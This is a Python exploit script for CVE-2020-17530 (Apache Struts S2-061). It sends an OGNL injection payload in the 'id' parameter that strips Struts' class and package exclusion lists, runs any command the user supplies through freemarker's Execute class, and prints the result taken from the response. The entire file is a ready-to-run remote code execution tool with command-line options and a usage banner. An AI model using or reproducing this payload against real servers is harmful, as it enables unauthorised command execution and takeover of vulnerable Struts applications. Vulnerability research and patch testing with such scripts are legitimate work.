#/usr/bin/python3
# -*- coding: utf-8 -*-
#2020/12/14/
#Marmot

import requests
import sys
import optparse
from lxml import etree

def exp(url,cmd):
    if url != None and cmd != None:
        payload = "/?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27" + cmd + "%27}).(%23res%3d%23exec.exec(%23cmd))}"
        url_exp = url + "/?id=" + payload
        try:
            r = requests.get(url_exp)
            page = r.text
            page = etree.HTML(page)
            data = page.xpath('//a[@id]/@id')
            print(data[0])
        except:
            print("vulnerability ?")
    else:
        print("[-] URL and Command cannot be empty")

def main():
    usage = "python3 -u http://127.0.0.1:8080 -w id"
    parser = optparse.OptionParser(usage)
    parser.add_option('-u',dest='url',type='string',help='URL')
    parser.add_option('-w',dest='command',type='string',help='Command')
    (options,args) = parser.parse_args()
    url = options.url
    cmd = options.command
    exp(url,cmd)

if __name__ == "__main__":
    print("""
 ____  ____        __    ___   __  
/ ___)(___ \ ___  /  \  / __) /  \ 
\___ \ / __/(___)(  0 )(  _ \(_/ / 
(____/(____)      \__/  \___/ (__) 
                    CVE-2020-17530

[*] python3 s2-061.py -u http://127.0.0.1:8080 -w id
    """)
    main()
